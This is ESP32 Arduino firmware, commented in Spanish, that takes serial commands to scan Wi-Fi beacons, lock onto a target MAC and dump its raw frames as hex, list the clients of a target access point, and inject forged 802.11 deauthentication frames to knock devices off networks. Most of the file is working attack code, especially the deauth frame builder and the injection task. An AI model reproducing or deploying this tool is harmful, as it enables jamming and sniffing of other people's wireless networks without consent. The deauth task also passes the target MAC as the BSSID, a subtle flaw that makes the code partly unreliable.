#include <Arduino.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <nvs_flash.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>

// Definición de estados de la máquina
enum SystemState {
  IDLE,
  SCAN,
  LOCK,
  DEAUTH,
  CLIENTS
};

// Mutex para proteger el estado compartido
static SemaphoreHandle_t state_mutex = NULL;

volatile SystemState current_state = IDLE;

// Tarea y variables de control
TaskHandle_t hopper_task_handle = NULL;
uint8_t target_mac[6] = {0};
uint8_t target_channel = 1;
uint8_t clients_target_bssid[6] = {0};
uint8_t clients_channel = 1;

void send_deauth_frame(uint8_t* dest_mac, uint8_t* bssid, uint8_t channel);

// Función segura para leer el estado
SystemState get_state() {
  if (state_mutex) {
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    SystemState s = current_state;
    xSemaphoreGive(state_mutex);
    return s;
  }
  return current_state;
}

// Función segura para cambiar el estado
void set_state(SystemState new_state) {
  if (state_mutex) {
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    current_state = new_state;
    xSemaphoreGive(state_mutex);
  } else {
    current_state = new_state;
  }
}

void channel_hopper_task(void *pvParameter) {
  uint8_t channel = 1;
  while (1) {
    // Verificar si seguimos en SCAN
    if (get_state() != SCAN) {
      hopper_task_handle = NULL;
      vTaskDelete(NULL);
    }
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    channel++;
    if (channel > 13) channel = 1;
    vTaskDelay(pdMS_TO_TICKS(250));
  }
}

void stop_hopper() {
  if (hopper_task_handle != NULL) {
    vTaskDelete(hopper_task_handle);
    hopper_task_handle = NULL;
  }
}

void start_hopper() {
  if (hopper_task_handle == NULL) {
    xTaskCreate(&channel_hopper_task, "channel_hopper", 2048, NULL, 5, &hopper_task_handle);
  }
}

// Buffer estático para evitar malloc en callback
static char hex_buffer[512];

void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  SystemState state = get_state();
  if (state == IDLE) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;
  uint16_t sig_len = pkt->rx_ctrl.sig_len;

  if (state == SCAN) {
    // Modo SCAN: Imprimir Beacons (filtrado original)
    if (type != WIFI_PKT_MGMT) return;
    if (payload[0] != 0x80) return; // Beacons frame control
    if (sig_len < 36) return;

    uint8_t *bssid = payload + 10; // BSSID position (Address 3)
    uint8_t current_channel = pkt->rx_ctrl.channel;
    
    int offset = 36;
    char ssid[33] = "<oculto>";
    ssid[32] = '\0';
    
    while (offset < sig_len) {
      uint8_t tag_num = payload[offset];
      if (offset + 1 >= sig_len) break;
      uint8_t tag_len = payload[offset + 1];
      
      if (tag_num == 0) {
        if (tag_len > 0 && (offset + 2 + tag_len) <= sig_len) {
          memcpy(ssid, payload + offset + 2, tag_len);
          ssid[tag_len] = '\0';
        }
        break;
      }
      offset += 2 + tag_len;
    }
    
    Serial.printf("[BEACON] CH: %2d | BSSID: %02x:%02x:%02x:%02x:%02x:%02x | SSID: %s\n",
                  current_channel, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ssid);
                  
  } else if (state == LOCK) {
    // Modo LOCK: Filtrar paquetes donde la MAC origen (addr2) o destino (addr1) coincidan
    if (sig_len < 24) return;
    if (sig_len > 255) return; // Limitar para evitar overflow del buffer
    
    uint8_t *addr1 = payload + 4;  // Destination Address
    uint8_t *addr2 = payload + 10; // Source Address
    
    bool match_addr1 = (memcmp(addr1, target_mac, 6) == 0);
    bool match_addr2 = (memcmp(addr2, target_mac, 6) == 0);
    
    if (match_addr1 || match_addr2) {
      // Filtrar solo tramas de Datos (Frame Control Type 0x02) o QoS Data (Subtype 0x08)
      uint8_t frame_control = payload[0];
      uint8_t fc_type = (frame_control >> 2) & 0x03;
      uint8_t fc_subtype = (frame_control >> 4) & 0x0F;

      if (fc_type == 0x02 || payload[0] == 0x80) { // Data frame or Beacon
        // Usar buffer estático en lugar de malloc
        uint16_t send_len = sig_len;
        uint16_t hex_len = send_len * 2;
        
        if (hex_len < sizeof(hex_buffer)) {
          for (uint16_t i = 0; i < send_len; i++) {
            // Conversión manual más rápida que sprintf
            uint8_t b = payload[i];
            hex_buffer[i * 2] = "0123456789abcdef"[b >> 4];
            hex_buffer[i * 2 + 1] = "0123456789abcdef"[b & 0x0F];
          }
          hex_buffer[hex_len] = '\0';
          Serial.printf("[RAW] %s\n", hex_buffer);
        }
      }
    }
  } else if (state == CLIENTS) {
    // Modo CLIENTS: Detectar Probe Request y Association Request dirigidos al BSSID target
    if (type != WIFI_PKT_MGMT) return;
    if (sig_len < 24) return;
    
    uint8_t frame_control = payload[0];
    uint8_t fc_type = (frame_control >> 2) & 0x03;
    uint8_t fc_subtype = (frame_control >> 4) & 0x0F;
    
    // Management frames type 0, subtype 4 = Probe Request, subtype 0 = Association Request
    if (fc_type == 0 && (fc_subtype == 4 || fc_subtype == 0)) {
      // BSSID es Address 3 (offset 16) en management frames
      uint8_t *bssid = payload + 16;
      if (memcmp(bssid, clients_target_bssid, 6) == 0) {
        uint8_t *client_mac = payload + 10; // Source Address (Address 2)
        const char* frame_type = (fc_subtype == 4) ? "Probe" : "Association";
        Serial.printf("[CLIENT] %02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x (%s Request)\n",
                      client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], frame_type);
      }
    }
  }
}

void parse_lock_command(const String& cmd) {
  // Expected format: CMD:LOCK:AA:BB:CC:DD:EE:FF:11
  String cmd_copy = cmd;
  cmd_copy.trim();
  int last_colon = cmd_copy.lastIndexOf(':');
  if (last_colon == -1 || last_colon <= 9) return;
  
  String mac_str = cmd_copy.substring(9, last_colon);
  String ch_str = cmd_copy.substring(last_colon + 1);
  
  uint8_t ch = ch_str.toInt();
  if (ch < 1 || ch > 14) {
    Serial.println("LOCK: Canal inválido (1-14).");
    return;
  }
  
  // Parse MAC
  int hex_vals[6];
  if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
             &hex_vals[0], &hex_vals[1], &hex_vals[2],
             &hex_vals[3], &hex_vals[4], &hex_vals[5]) == 6) {
    for (int i = 0; i < 6; i++) {
      target_mac[i] = (uint8_t)hex_vals[i];
    }
    
    target_channel = ch;
    stop_hopper();
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    set_state(LOCK);
    Serial.printf("LOCK: Target MAC=%s, CH=%d\n", mac_str.c_str(), target_channel);
  } else {
    Serial.println("LOCK: Error parsing MAC address.");
  }
}

// Variables globales para tarea de deauth no-bloqueante
TaskHandle_t deauth_task_handle = NULL;
uint8_t deauth_target_mac[6] = {0};
uint8_t deauth_channel = 1;
uint8_t deauth_count = 0;
char deauth_mac_str[18] = {0};

void deauth_task(void *pvParameter) {
  esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
  set_state(DEAUTH);
  Serial.printf("DEAUTH: Enviando %d frames a %s en canal %d\n", deauth_count, deauth_mac_str, deauth_channel);
  
  for (int i = 0; i < deauth_count; i++) {
    if (get_state() != DEAUTH) break; // Permitir cancelación
    send_deauth_frame(deauth_target_mac, deauth_target_mac, deauth_channel);
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  
  Serial.printf("DEAUTH: Enviados %d frames a %s\n", deauth_count, deauth_mac_str);
  set_state(IDLE);
  deauth_task_handle = NULL;
  vTaskDelete(NULL);
}

void parse_deauth_command(const String& cmd) {
  // Expected format: CMD:DEAUTH:AA:BB:CC:DD:EE:FF:CHANNEL:COUNT
  String cmd_copy = cmd;
  cmd_copy.trim();
  String args = cmd_copy.substring(11);
  int first_colon = args.indexOf(':');
  if (first_colon == -1) return;
  
  String mac_str = args.substring(0, first_colon);
  String rest = args.substring(first_colon + 1);
  int second_colon = rest.indexOf(':');
  if (second_colon == -1) return;
  
  String ch_str = rest.substring(0, second_colon);
  String count_str = rest.substring(second_colon + 1);
  
  uint8_t channel = ch_str.toInt();
  uint8_t count = count_str.toInt();
  
  if (channel < 1 || channel > 14) {
    Serial.println("DEAUTH: Canal inválido (1-14).");
    return;
  }
  if (count < 1 || count > 100) {
    Serial.println("DEAUTH: Count inválido (1-100).");
    return;
  }
  
  int hex_vals[6];
  if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
             &hex_vals[0], &hex_vals[1], &hex_vals[2],
             &hex_vals[3], &hex_vals[4], &hex_vals[5]) != 6) {
    Serial.println("DEAUTH: Error parsing MAC address.");
    return;
  }
  for (int i = 0; i < 6; i++) {
    deauth_target_mac[i] = (uint8_t)hex_vals[i];
  }
  
  // Si ya hay una tarea de deauth corriendo, cancelarla
  if (deauth_task_handle != NULL) {
    vTaskDelete(deauth_task_handle);
    deauth_task_handle = NULL;
  }
  
  deauth_channel = channel;
  deauth_count = count;
  snprintf(deauth_mac_str, sizeof(deauth_mac_str), "%s", mac_str.c_str());
  
  xTaskCreate(&deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
}

void send_deauth_frame(uint8_t* dest_mac, uint8_t* bssid, uint8_t channel) {
  // Estructura del frame deauth (26 bytes)
  uint8_t deauth_frame[26] = {0};
  
  // Frame Control (0xC0 0x00) - Deauthentication
  deauth_frame[0] = 0xC0;
  deauth_frame[1] = 0x00;
  
  // Duration (0x00 0x00)
  deauth_frame[2] = 0x00;
  deauth_frame[3] = 0x00;
  
  // Dest MAC (6 bytes)
  memcpy(&deauth_frame[4], dest_mac, 6);
  
  // Source MAC (6 bytes) - BSSID (AP)
  memcpy(&deauth_frame[10], bssid, 6);
  
  // BSSID (6 bytes)
  memcpy(&deauth_frame[16], bssid, 6);
  
  // Sequence Control (0x00 0x00)
  deauth_frame[22] = 0x00;
  deauth_frame[23] = 0x00;
  
  // Reason Code (0x07 0x00) - Class 3 frame received from nonassociated STA
  deauth_frame[24] = 0x07;
  deauth_frame[25] = 0x00;
  
  // Enviar frame raw usando esp_wifi_80211_tx
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
}

// Variables globales para tarea de clients no-bloqueante
TaskHandle_t clients_task_handle = NULL;

void clients_task(void *pvParameter) {
  uint32_t timeout_ms = 5000;
  uint32_t start_time = millis();
  
  while (millis() - start_time < timeout_ms) {
    if (get_state() != CLIENTS) break; // Permitir cancelación
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  
  set_state(IDLE);
  Serial.println("CLIENTS: Escaneo completado.");
  clients_task_handle = NULL;
  vTaskDelete(NULL);
}

void parse_clients_command(const String& cmd) {
  // Expected format: CMD:CLIENTS:AA:BB:CC:DD:EE:FF
  String cmd_copy = cmd;
  cmd_copy.trim();
  String mac_str = cmd_copy.substring(12);
  
  int hex_vals[6];
  if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
             &hex_vals[0], &hex_vals[1], &hex_vals[2],
             &hex_vals[3], &hex_vals[4], &hex_vals[5]) != 6) {
    Serial.println("CLIENTS: Error parsing BSSID.");
    return;
  }
  for (int i = 0; i < 6; i++) {
    clients_target_bssid[i] = (uint8_t)hex_vals[i];
  }
  
  uint8_t channel = target_channel;
  if (channel == 0) channel = 1;
  clients_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Si ya hay una tarea de clients corriendo, cancelarla
  if (clients_task_handle != NULL) {
    vTaskDelete(clients_task_handle);
    clients_task_handle = NULL;
  }
  
  Serial.printf("CLIENTS: Escaneando clientes asociados a %s en canal %d (5 segundos)\n", mac_str.c_str(), channel);
  set_state(CLIENTS);
  
  xTaskCreate(&clients_task, "clients_task", 2048, NULL, 5, &clients_task_handle);
}

void print_status() {
  SystemState state = get_state();
  const char* state_str = "";
  switch (state) {
    case IDLE: state_str = "IDLE"; break;
    case SCAN: state_str = "SCAN"; break;
    case LOCK: state_str = "LOCK"; break;
    case DEAUTH: state_str = "DEAUTH"; break;
    case CLIENTS: state_str = "CLIENTS"; break;
    default: state_str = "UNKNOWN"; break;
  }
  
  // Check if target MAC is zero
  bool has_target = false;
  for (int i = 0; i < 6; i++) {
    if (target_mac[i] != 0) {
      has_target = true;
      break;
    }
  }
  
  Serial.printf("STATUS: %s\n", state_str);
  Serial.printf("CHANNEL: %d\n", target_channel);
  if (has_target) {
    Serial.printf("TARGET: %02x:%02x:%02x:%02x:%02x:%02x\n",
                  target_mac[0], target_mac[1], target_mac[2],
                  target_mac[3], target_mac[4], target_mac[5]);
  } else {
    Serial.println("TARGET: NONE");
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Crear mutex para protección de estado
  state_mutex = xSemaphoreCreateMutex();

  esp_err_t err = nvs_flash_init();
  if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    nvs_flash_erase();
    err = nvs_flash_init();
  }

  esp_netif_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
  esp_wifi_set_promiscuous(true);
  
  // Estado inicial
  set_state(IDLE);
  Serial.println("HEesp32 Iniciado. Estado: IDLE. Esperando comandos...");
}

void loop() {
  if (Serial.available() > 0) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    
    if (cmd == "CMD:IDLE") {
      set_state(IDLE);
      stop_hopper();
      // Cancelar tareas activas
      if (deauth_task_handle != NULL) {
        vTaskDelete(deauth_task_handle);
        deauth_task_handle = NULL;
        Serial.println("DEAUTH: Cancelado.");
      }
      if (clients_task_handle != NULL) {
        vTaskDelete(clients_task_handle);
        clients_task_handle = NULL;
        Serial.println("CLIENTS: Cancelado.");
      }
      Serial.println("IDLE: Detenido.");
    }
    else if (cmd == "CMD:SCAN") {
      set_state(SCAN);
      start_hopper();
      Serial.println("SCAN: Iniciado.");
    }
    else if (cmd == "CMD:STATUS") {
      print_status();
    }
    else if (cmd.startsWith("CMD:LOCK:")) {
      parse_lock_command(cmd);
    }
    else if (cmd.startsWith("CMD:DEAUTH:")) {
      parse_deauth_command(cmd);
    }
    else if (cmd.startsWith("CMD:CLIENTS:")) {
      parse_clients_command(cmd);
    }
  }
  
  vTaskDelay(pdMS_TO_TICKS(10)); // Yield to allow other tasks
}
